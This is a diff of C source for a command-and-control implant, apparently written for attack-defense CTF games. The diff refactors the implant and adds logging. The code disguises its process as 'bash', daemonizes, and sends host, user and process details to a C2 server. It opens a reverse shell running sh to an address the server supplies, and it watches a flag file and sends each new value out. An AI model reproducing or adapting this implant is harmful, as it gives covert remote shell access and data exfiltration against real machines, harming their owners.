@@ -17,7 +17,9 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+
 #include "tiny-c-http-client/http.h"
+#include "log.h"
 
 // =================== 配置 ===================
 #define FLAG_PATH "/home/ctf/flag/flag"
@@ -26,22 +28,20 @@
 #define C2_HOST "pss"
 #define SINGLE_INSTANCE_CHECK_FILE "/tmp/.php_lock"
 
-static char last_flag[256] = "fuckyou";
+static char last_flag[256] = ""; // 声明为空字符串, 不要填入内容
 
-// =================== 单实例机制 ===================
+// 保证只有一个c2在运行中
 __attribute__((constructor))
 void enforceSingleInstance(void) {
     int lock_fd = open(SINGLE_INSTANCE_CHECK_FILE, O_RDWR | O_CREAT, 0600);
     if (lock_fd == -1 || flock(lock_fd, LOCK_EX | LOCK_NB) == -1) {
-#ifdef DEBUG
-        printf("Another process detected, exiting.\n");
-#endif
-        _exit(1);
+        LOG_DEBUG("Another process detected, exiting.\n");
+        _exit(0);
     }
 }
 
-// =================== 获取基本信息 ===================
-char* read_hostname() {
+// 收集信息用于区分不同靶机, 一般来说靶机都是基于qemu/docker这种批量克隆, 能收集的信息不多
+char* getHostname() {
     static char buf[128];
     FILE *fp = fopen("/etc/hostname", "r");
     if (!fp) {
@@ -54,18 +54,43 @@ char* read_hostname() {
     return buf;
 }
 
-char* get_username() {
-    struct passwd *pw = getpwuid(getuid());
-    return pw ? pw->pw_name : "unknown";
+char* getCurrentUserInfo() {
+    static char buffer[256];
+    uid_t uid = getuid();
+    struct passwd *pw = getpwuid(uid);
+    
+    if (pw) {
+        snprintf(buffer, sizeof(buffer), "%s(%u)", pw->pw_name, (unsigned int)uid);
+    } else {
+        snprintf(buffer, sizeof(buffer), "unknown(%u)", (unsigned int)uid);
+    }
+    
+    return buffer;
 }
 
-char* get_process_name() {
-    static char pname[64];
-    if (readlink("/proc/self/exe", pname, sizeof(pname)-1) != -1) {
-        return pname;
+char* getProcessInfo() {
+    static char buffer[256];
+    char path[256];
+    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    
+    if (len != -1) {
+        path[len] = '\0';  // readlink 不添加 null 终止符，需要手动添加
+
+        char *process_name = strrchr(path, '/');
+        if (process_name) {
+            process_name++;  // 跳过 '/'
+        } else {
+            process_name = path;
+        }
+        
+        snprintf(buffer, sizeof(buffer), "%s(%d)", process_name, getpid());
+    } else {
+        snprintf(buffer, sizeof(buffer), "unknown(%d)", getpid());
     }
-    return "unknown";
+    
+    return buffer;
 }
+
 
 void initiateDirectReverseShell(char *reverseShellInfo) {
     if (!reverseShellInfo) return;
@@ -76,9 +101,7 @@ void initiateDirectReverseShell(char *reverseShellInfo) {
     port = strtok(NULL, "|");
     if (!ip || !port) return;
 
-    #ifdef DEBUG
-    printf("[initiateDirectReverseShell]: Initiated reverse shell to %s:%s\n", ip, port);
-    #endif
+    LOG_DEBUG("[initiateDirectReverseShell]: Initiated reverse shell to %s:%s\n", ip, port);
 
     pid_t pid = fork();
     // fork()失败或者为父进程就直接退出
@@ -97,28 +120,28 @@ void initiateDirectReverseShell(char *reverseShellInfo) {
         execlp("sh", "sh", NULL);
 }
 
-// =================== HTTP 帮助函数 ===================
-int send_flag(const char *flag) {
-    char url[512];
-    snprintf(url, sizeof(url), "/api/c2/submit-flag?flag=%s", flag);
-
+int httpSendFlag(const char *flag) {
+    char data[512];
+    snprintf(data, sizeof(data), "{\"flag\":\"%s\"}", flag);
+    
     HTTPRequestInfo req = {
         C2_IP, C2_HOST, C2_PORT, -1,
-        HTTP_GET, url,
-        CONTENT_TYPE_TEXT_PLAIN,
-        NULL, NULL, -1
+        HTTP_POST, "/api/c2/submit-flag",
+        CONTENT_TYPE_APPLICATION_JSON,
+        NULL, data, strlen(data)
     };
+    
     int s = SendHTTPRequest(&req);
     HTTPResponseInfo *resp = FetchHTTPResponse(&req);
     FreeHTTPResponseResource(resp);
     return s;
 }
 
-int send_heartbeat() {
+int httpSendHeartbeat() {
     char data[512];
     snprintf(data, sizeof(data),
-             "{\"hostname\":\"%s\",\"username\":\"%s\",\"pid\":\"%d\",\"process_name\":\"%s\"}",
-             read_hostname(), get_username(), getpid(), get_process_name());
+             "{\"hostname\":\"%s\",\"userinfo\":\"%s\",\"processinfo\":\"%s\"}",
+             getHostname(), getCurrentUserInfo(), getProcessInfo());
 
     HTTPRequestInfo req = {
         C2_IP, C2_HOST, C2_PORT, -1,
@@ -138,7 +161,7 @@ int send_heartbeat() {
     return ret;
 }
 
-char* get_rs_addr() {
+char* httpGetRevshellAddr() {
     HTTPRequestInfo req = {
         C2_IP, C2_HOST, C2_PORT, -1,
         HTTP_GET, "/api/c2/get-rs",
@@ -155,8 +178,7 @@ char* get_rs_addr() {
     return addr;
 }
 
-// =================== 守护化 ===================
-static void setup_signal(int signum) {
+static void setupSignal(int signum) {
     struct sigaction sa;
     sa.sa_handler = SIG_IGN;
     sigemptyset(&sa.sa_mask);
@@ -165,42 +187,39 @@ static void setup_signal(int signum) {
 }
 
 void daemonize() {
-    setup_signal(SIGCHLD);
+    setupSignal(SIGCHLD);
 #ifndef DEBUG
     pid_t pid = fork();
     if (pid < 0) exit(1);
     if (pid > 0) exit(0);
 
     setsid();
-    setup_signal(SIGTERM);
-    setup_signal(SIGINT);
+    setupSignal(SIGTERM);
+    setupSignal(SIGINT);
 
     chdir("/");
     close(0); close(1); close(2);
 #endif
 }
 
-// =================== Flag 监控 ===================
-void monitor_flag() {
-    last_flag[256] = "fuckyou";
+// 监控flag变化
+void monitorFlagChange() {
     FILE *fp = fopen(FLAG_PATH, "r");
     if (fp) {
         char buf[256];
         if (fgets(buf, sizeof(buf), fp)) {
             buf[strcspn(buf, "\n")] = 0;
-            if (strcmp(buf, last_flag) != 0) {
+
+            if (last_flag[0] == '\0' || strcmp(buf, last_flag) != 0) {
                 strcpy(last_flag, buf);
-                send_flag(buf);
-#ifdef DEBUG
-                printf("[FLAG] Submitted: %s\n", buf);
-#endif
+                httpSendFlag(buf);
+                LOG_DEBUG("[FLAG] Submitted: %s\n", buf);
             }
         }
         fclose(fp);
     }
 }
 
-// =================== 主逻辑 ===================
 int main(int argc, char *argv[]) {
     static char new_name[] = "bash";
     srand(time(NULL));
@@ -215,17 +234,16 @@ int main(int argc, char *argv[]) {
     unsigned ticks = 60;
     while (1) {
         if (ticks >= 60) {
-            int res = send_heartbeat();
+            int res = httpSendHeartbeat();
             if (res == 1) {
-                char *rs = get_rs_addr();
+                char *rs = httpGetRevshellAddr();
                 initiateDirectReverseShell(rs);
                 free(rs);
             }
             ticks = 0;
-            last_flag[256] = {0};
         }
-        monitor_flag();
-        sleep(1); // 每60s心跳
+        monitorFlagChange();
+        sleep(1);
         ticks++;
     }
     return 0;
